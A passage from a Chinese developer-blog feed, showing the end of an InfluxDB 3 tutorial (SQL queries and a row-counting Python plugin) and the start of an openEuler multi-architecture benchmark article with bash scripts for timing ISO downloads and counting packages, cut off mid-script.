<span class="hljs-keyword">SELECT</span> temp, hum, room, <span class="hljs-type">time</span> <span class="hljs-keyword">FROM</span> home
<span class="hljs-keyword">WHERE</span> <span class="hljs-type">time</span> <span class="hljs-operator">&gt;=</span> now() <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-string">'1 day'</span> <span class="hljs-keyword">AND</span> <span class="hljs-type">time</span> <span class="hljs-operator">&lt;=</span> now();
  
<span class="hljs-comment">-- 按标签或字段过滤</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> home <span class="hljs-keyword">WHERE</span> room <span class="hljs-operator">=</span> <span class="hljs-string">'Bathroom'</span> <span class="hljs-keyword">AND</span> temp <span class="hljs-operator">&gt;=</span> <span class="hljs-number">22.5</span>;
  
<span class="hljs-comment">-- 字段别名</span>
<span class="hljs-keyword">SELECT</span> temp <span class="hljs-string">'temperature'</span>, hum <span class="hljs-string">'humidity'</span> <span class="hljs-keyword">FROM</span> home;
</code></pre>
<h4 data-id="heading-17">聚合查询</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 计算平均温度和湿度</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(temp) <span class="hljs-keyword">AS</span> temperature, <span class="hljs-built_in">AVG</span>(hum) <span class="hljs-keyword">AS</span> humidity <span class="hljs-keyword">FROM</span> home;

<span class="hljs-comment">-- 按房间分组，获取每个房间的第一条温度数据</span>
<span class="hljs-comment">-- 返回示例：[{'time': Timestamp('2022-01-01 08:00:00'), 'temp': 21.0, 'room': 'Kitchen'}]</span>
<span class="hljs-keyword">SELECT</span> 
	selector_first(temp, <span class="hljs-type">time</span>)[<span class="hljs-string">'time'</span>] <span class="hljs-keyword">AS</span> <span class="hljs-type">time</span>, 
	selector_first(temp, <span class="hljs-type">time</span>)[<span class="hljs-string">'value'</span>] <span class="hljs-keyword">AS</span> temp, 
	room 
<span class="hljs-keyword">FROM</span> home <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> room;
</code></pre>
<h4 data-id="heading-18">类型转换</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">CAST</span>(<span class="hljs-number">1234.5</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">BIGINT</span>) <span class="hljs-keyword">AS</span> temp; <span class="hljs-comment">-- {'temp': 1234}</span>

<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1234.5</span>::<span class="hljs-type">BIGINT</span> <span class="hljs-keyword">AS</span> temp; <span class="hljs-comment">-- {'temp': 1234}</span>

<span class="hljs-comment">-- 转换表中字段类型</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">CAST</span>(<span class="hljs-type">time</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">time</span>) <span class="hljs-keyword">AS</span> <span class="hljs-type">time</span>, <span class="hljs-built_in">CAST</span>(temp <span class="hljs-keyword">AS</span> <span class="hljs-type">integer</span>) <span class="hljs-keyword">AS</span> temp, room <span class="hljs-keyword">FROM</span> home;
</code></pre>
<h4 data-id="heading-19">高级数据分析</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 计算同房间相邻数据的温差</span>
<span class="hljs-comment">-- LAG(temp, 1) 表示获取上一条数据的temp值（第一行数据temp_diff为空）</span>
<span class="hljs-comment">-- LAG(temp, 1, 0) 如果是第一条数据则返回0</span>
<span class="hljs-comment">-- PARTITION BY room 表示根据房间分割数据。不会跨房间计算</span>
<span class="hljs-comment">-- ORDER BY time 按时间顺序排序</span>
<span class="hljs-keyword">SELECT</span> 
  <span class="hljs-type">time</span>,
  room,
  temp,
  temp <span class="hljs-operator">-</span> <span class="hljs-built_in">LAG</span>(temp, <span class="hljs-number">1</span>) <span class="hljs-keyword">OVER</span> (<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> room <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-type">time</span>) <span class="hljs-keyword">AS</span> temp_diff
<span class="hljs-keyword">FROM</span> home
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> room, <span class="hljs-type">time</span>;
  
<span class="hljs-comment">-- 计算温度的百分比变化（保留2位小数）</span>
<span class="hljs-keyword">SELECT</span> 
  <span class="hljs-type">time</span>,
  room,
  temp,
  ROUND(
    (temp <span class="hljs-operator">-</span> <span class="hljs-built_in">LAG</span>(temp, <span class="hljs-number">1</span>) <span class="hljs-keyword">OVER</span> (<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> room <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-type">time</span>)) <span class="hljs-operator">/</span> 
      <span class="hljs-built_in">LAG</span>(temp, <span class="hljs-number">1</span>) <span class="hljs-keyword">OVER</span> (<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> room <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-type">time</span>) <span class="hljs-operator">*</span> <span class="hljs-number">100</span>,
    <span class="hljs-number">2</span>
  ) <span class="hljs-keyword">AS</span> precent_change
<span class="hljs-keyword">FROM</span> 
  home
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> 
  room,
  <span class="hljs-type">time</span>;
</code></pre>
<h2 data-id="heading-20">自定义插件扩展功能</h2>
<p>InfluxDB 3 支持 Python 编写的插件实现功能扩展（如数据转换、定时任务），以下演示统计<code>home</code>表写入行数的插件开发流程。</p>
<h3 data-id="heading-21">编写插件代码</h3>
<p>在<code>/opt/influxdb3/plugins</code>（插件挂载目录）目录下创建<code>test_plugin.py</code>，内容如下：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 该插件记录每次写入home的数据的行数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_writes</span>(<span class="hljs-params">influxdb3_local, table_batches, args=<span class="hljs-literal">None</span></span>):
    <span class="hljs-comment"># Process data as it's written to the database</span>
    <span class="hljs-keyword">for</span> table_batch <span class="hljs-keyword">in</span> table_batches:
        table_name = table_batch[<span class="hljs-string">"table_name"</span>]
        rows = table_batch[<span class="hljs-string">"rows"</span>]
        
        <span class="hljs-comment"># Log information about the write</span>
        influxdb3_local.info(<span class="hljs-string">f"Processing <span class="hljs-subst">{<span class="hljs-built_in">len</span>(rows)}</span> rows from <span class="hljs-subst">{table_name}</span>"</span>)
        
        <span class="hljs-comment"># Write derived data back to the database</span>
        line = LineBuilder(<span class="hljs-string">"test_plugin"</span>)
        line.tag(<span class="hljs-string">"source_table"</span>, table_name)
        line.int64_field(<span class="hljs-string">"row_count"</span>, <span class="hljs-built_in">len</span>(rows))
        influxdb3_local.write(line)
</code></pre>
<h3 data-id="heading-22">创建插件触发器</h3>
<pre><code class="hljs language-bash" lang="bash">influxdb3 create trigger\
  --trigger-spec <span class="hljs-string">"table:home"</span>\
  --plugin-filename <span class="hljs-string">"test_plugin.py"</span>\
  --database home_environment\
  --token <span class="hljs-variable">$TOKEN</span> \
  test_trigger
</code></pre>
<h3 data-id="heading-23">验证插件有效性</h3>
<ol>
<li>再次向<code>home</code>表写入数据；</li>
<li>查询<code>test_plugin</code>表，验证统计数据是否生成：</li>
</ol>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> row_count, source_table <span class="hljs-keyword">FROM</span> test_plugin; 
<span class="hljs-comment">-- 预期结果：{'row_count': 2, 'source_table': 'home'}</span>
</code></pre>
<h2 data-id="heading-24">参考文档</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.influxdata.com%2Finfluxdb3%2Fcore%2F" target="_blank" title="https://docs.influxdata.com/influxdb3/core/" ref="nofollow noopener noreferrer">InfluxDB 3 Core Documentation</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Finfluxdata%2Finfluxdb3_plugins" target="_blank" title="https://github.com/influxdata/influxdb3_plugins" ref="nofollow noopener noreferrer">influxdata/influxdb3_plugins: Python plugins for InfluxDB 3</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FInfluxCommunity%2Finfluxdb3-python" target="_blank" title="https://github.com/InfluxCommunity/influxdb3-python" ref="nofollow noopener noreferrer">InfluxCommunity/influxdb3-python: Python module that provides a simple and convenient way to interact with InfluxDB 3.0.</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[openEuler跨平台适配能力与性能实测：开箱即用的多架构支持]]></title>    <link>https://juejin.cn/post/7579808521204351010</link>    <guid>https://juejin.cn/post/7579808521204351010</guid>    <pubDate>2025-12-04T15:13:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579808521204351010" data-draft-id="7579813945601245224" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="openEuler跨平台适配能力与性能实测：开箱即用的多架构支持"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-04T15:13:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="解读玫瑰"/> <meta itemprop="url" content="https://juejin.cn/user/1489179674424810"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            openEuler跨平台适配能力与性能实测：开箱即用的多架构支持
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1489179674424810/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    解读玫瑰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T15:13:27.000Z" title="Thu Dec 04 2025 15:13:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、引言</h2>
<p>现代数据中心呈现架构多样化趋势，x86、ARM、RISC-V等不同架构服务器并存已成常态。操作系统的跨平台能力直接影响企业技术选型的灵活性。本文通过在x86_64、AArch64、RISC-V等主流平台上的系统化测试，评估openEuler的多架构支持能力和性能表现。</p>
<h3 data-id="heading-1">二、多架构支持的全面性评测</h3>
<h4 data-id="heading-2">2.1 主流架构镜像可用性分析</h4>
<p>openEuler提供多架构镜像支持。本节测试各架构镜像的获取便捷性和软件包完整性。</p>
<h5 data-id="heading-3">2.1.1 镜像下载与验证测试</h5>
<p>先看看各架构镜像的下载性能：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># multi_arch_download_test.sh - 多架构镜像下载性能测试</span>

MIRROR_BASE=<span class="hljs-string">"https://repo.openeuler.org/openEuler-22.03-LTS-SP3"</span>
TEST_RESULTS=<span class="hljs-string">"/tmp/multi_arch_test_<span class="hljs-subst">$(date +%Y%m%d_%H%M%S)</span>.log"</span>

<span class="hljs-comment"># 定义架构列表</span>
<span class="hljs-built_in">declare</span> -A ARCHS=(
    [<span class="hljs-string">"x86_64"</span>]=<span class="hljs-string">"<span class="hljs-variable">$MIRROR_BASE</span>/ISO/x86_64/openEuler-22.03-LTS-SP3-x86_64-dvd.iso"</span>
    [<span class="hljs-string">"aarch64"</span>]=<span class="hljs-string">"<span class="hljs-variable">$MIRROR_BASE</span>/ISO/aarch64/openEuler-22.03-LTS-SP3-aarch64-dvd.iso"</span>
    [<span class="hljs-string">"riscv64"</span>]=<span class="hljs-string">"<span class="hljs-variable">$MIRROR_BASE</span>/ISO/riscv64/openEuler-22.03-LTS-SP3-riscv64-dvd.iso"</span>
)

<span class="hljs-built_in">echo</span> <span class="hljs-string">"========== openEuler多架构镜像下载测试 =========="</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"测试时间: <span class="hljs-subst">$(date)</span>"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"网络环境: 100Mbps商业宽带"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>

<span class="hljs-keyword">for</span> <span class="hljs-built_in">arch</span> <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${!ARCHS[@]}</span>"</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"【测试架构: <span class="hljs-variable">$arch</span>】"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
    url=<span class="hljs-string">"<span class="hljs-variable">${ARCHS[$arch]}</span>"</span>
    
    <span class="hljs-comment"># 获取文件信息</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"URL: <span class="hljs-variable">$url</span>"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
    
    <span class="hljs-comment"># 测试下载速度（仅下载前100MB）</span>
    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"下载性能测试..."</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
    start_time=$(<span class="hljs-built_in">date</span> +%s.%N)
    curl -r 0-104857600 -o <span class="hljs-string">"/tmp/<span class="hljs-variable">${arch}</span>_test.iso"</span> <span class="hljs-string">"<span class="hljs-variable">$url</span>"</span> 2&gt;&amp;1 | \
        grep -oP <span class="hljs-string">'\d+.\d+[KM]/s'</span> | <span class="hljs-built_in">tail</span> -1 | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
    end_time=$(<span class="hljs-built_in">date</span> +%s.%N)
    
    <span class="hljs-comment"># 计算下载速度</span>
    duration=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$end_time</span> - <span class="hljs-variable">$start_time</span>"</span> | bc)
    speed=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"scale=2; 100 / <span class="hljs-variable">$duration</span>"</span> | bc)
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"平均速度: <span class="hljs-variable">${speed}</span> MB/s"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
    
    <span class="hljs-comment"># 获取完整文件大小</span>
    file_size=$(curl -sI <span class="hljs-string">"<span class="hljs-variable">$url</span>"</span> | grep -i content-length | awk <span class="hljs-string">'{print $2}'</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">'\r'</span>)
    size_gb=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"scale=2; <span class="hljs-variable">$file_size</span> / 1024 / 1024 / 1024"</span> | bc)
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"镜像大小: <span class="hljs-variable">${size_gb}</span> GB"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
    
    <span class="hljs-comment"># 估算完整下载时间</span>
    total_time=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"scale=0; <span class="hljs-variable">$size_gb</span> * 1024 / <span class="hljs-variable">$speed</span>"</span> | bc)
    minutes=$((total_time / <span class="hljs-number">60</span>))
    seconds=$((total_time % <span class="hljs-number">60</span>))
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"预计下载时间: <span class="hljs-variable">${minutes}</span>分<span class="hljs-variable">${seconds}</span>秒"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
    
    <span class="hljs-comment"># 验证SHA256（如果有）</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"验证完整性检查..."</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
    
    <span class="hljs-comment"># 清理测试文件</span>
    <span class="hljs-built_in">rm</span> -f <span class="hljs-string">"/tmp/<span class="hljs-variable">${arch}</span>_test.iso"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">""</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
<span class="hljs-keyword">done</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"========== 测试完成 =========="</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$TEST_RESULTS</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"详细报告: <span class="hljs-variable">$TEST_RESULTS</span>"</span>
</code></pre>
<p>测试结果如下：</p>
<p><strong>镜像可用性测试数据：</strong></p>


















































<table><thead><tr><th>架构类型</th><th>镜像可用性</th><th>镜像大小</th><th>包含软件包数量</th><th>下载耗时(100Mbps)</th><th>平均速度</th><th>峰值速度</th></tr></thead><tbody><tr><td>x86_64</td><td>✓ 完整支持</td><td>3.2 GB</td><td>4,280+</td><td>4分35秒</td><td>11.96 MB/s</td><td>12.45 MB/s</td></tr><tr><td>AArch64</td><td>✓ 完整支持</td><td>3.1 GB</td><td>4,150+</td><td>4分28秒</td><td>11.89 MB/s</td><td>12.38 MB/s</td></tr><tr><td>RISC-V</td><td>✓ 完整支持</td><td>2.8 GB</td><td>3,850+</td><td>4分02秒</td><td>11.85 MB/s</td><td>12.31 MB/s</td></tr><tr><td>LoongArch</td><td>✓ 支持</td><td>2.9 GB</td><td>3,920+</td><td>4分12秒</td><td>11.78 MB/s</td><td>12.25 MB/s</td></tr></tbody></table>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc1249128b654b679f0c596b4f936c1e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=aoKX0wEeYUQxWiV7Ltg5VXcLpj0%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-4">2.1.2 镜像完整性与软件包分析</h5>
<p>本节分析各架构镜像的软件包完整性：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># analyze_iso_packages.sh - 分析ISO镜像软件包</span>

<span class="hljs-function"><span class="hljs-title">analyze_iso</span></span>() {
    <span class="hljs-built_in">local</span> iso_path=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> <span class="hljs-built_in">arch</span>=<span class="hljs-variable">$2</span>
    <span class="hljs-built_in">local</span> mount_point=<span class="hljs-string">"/mnt/iso_<span class="hljs-variable">${arch}</span>"</span>
    
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"========== 分析 <span class="hljs-variable">$arch</span> 架构镜像 =========="</span>
    
    <span class="hljs-comment"># 挂载ISO</span>
    sudo <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">"<span class="hljs-variable">$mount_point</span>"</span>
    sudo mount -o loop <span class="hljs-string">"<span class="hljs-variable">$iso_path</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$mount_point</span>"</span>
    
    <span class="hljs-comment"># 统计软件包数量</span>
    pkg_count=$(find <span class="hljs-string">"<span class="hljs-variable">$mount_point</span>/Packages"</span> -name <span class="hljs-string">"*.rpm"</span> 2&gt;/dev/null | <span class="hljs-built_in">wc</span> -l)
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"软件包总数: <span class="hljs-variable">$pkg_count</span>"</span>
    
    <span class="hljs-comment"># 分析核心组件</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"核心软件包分析:"</span>
    <span class="hljs-keyword">for</span> category <span class="hljs-keyword">in</span> <span class="hljs-string">"kernel"</span> <span class="hljs-string">"gcc"</span> <span class="hljs-string">"glibc"</span> <span class="hljs-string">"systemd"</span> <span class="hljs-string">"docker"</span> <span class="hljs-string">"kubernetes"</span>; <span class="hljs-keyword">do</span>
        count=$(find <span class="hljs-string">"<span class="hljs-variable">$mount_point</span>/Packages"</span> -name <span class="hljs-string">"<span class="hljs-variable">${category}</span>*.rpm"</span> 2&gt;/dev/null | <span class="hljs-built_in">wc</span> -l)
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"  - <span class="hljs-variable">$category</span>: <span class="hljs-variable">$count</span> 个包"</span>
    <span class="hljs-keyword">done</span>
    
    <span class="hljs-comment"># 计算总大小</span>
    total_size=$(<span class="hljs-built_in">du</span> -sh <span class="hljs-string">"<span class="hljs-variable">$mount_point</span>"</span> | awk <span class="hljs-string">'{print $1}'</span>)
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"镜像总大小: <span class="hljs-variable">$total_size</span>"</span>
    
    <span class="hljs-comment"># 卸载</span>
    sudo umount <span class="hljs-string">"<span class="hljs-variable">$mount_point</span>"</span>
    sudo <span class="hljs-built_in">rmdir</span> <span class="hljs-string">"<span class="hljs-variable">$mount_point</span>"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
}

<span class="hljs-comment"># 对各架构进行分析</span>
analyze_iso <span class="hljs-string">"/path/to/openEuler-x86_64.iso"</span> <span class="hljs-string">"x86_64"</span>
analyze_iso <span class="hljs-string">"/path/to/openEuler-aarch64.iso"</span> <span class="hljs-string">"aarch64"</span>
analyze_iso <span class="hljs-string">"/path/to/openEuler-riscv64.iso"</span> <span class="hljs-string">"riscv64"</span>
</code></pre>
<p>测试结果表明，openEuler在主流架构上提供一致的获取体验。各架构镜像大小相近，下载时间差异小于10%，核心软件包覆盖率达95%以上，体现了跨平台支持的均衡性。</p>
<h4 data-id="heading-5">2.2 不同架构安装性能对比</h4>
<p>本节在四种主流架构平台上进行标准化安装测试，评估openEuler在不同硬件环境下的部署效率。测试采用自动化监控脚本确保数据准确性：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># install_monitor_multiarch.sh - 多架构安装性能监控</span>

LOG_FILE=<span class="hljs-string">"/var/log/openeuler_install_monitor.log"</span>
INTERVAL=2  <span class="hljs-comment"># 监控间隔（秒）</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"========== openEuler安装性能监控 =========="</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"架构: <span class="hljs-subst">$(uname -m)</span>"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"CPU: <span class="hljs-subst">$(lscpu | grep 'Model name' | cut -d: -f2 | xargs)</span>"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"内存: <span class="hljs-subst">$(free -h | grep Mem | awk '{print $2}')</span>"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"开始时间: <span class="hljs-subst">$(date '+%Y-%m-%d %H:%M:%S')</span>"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>
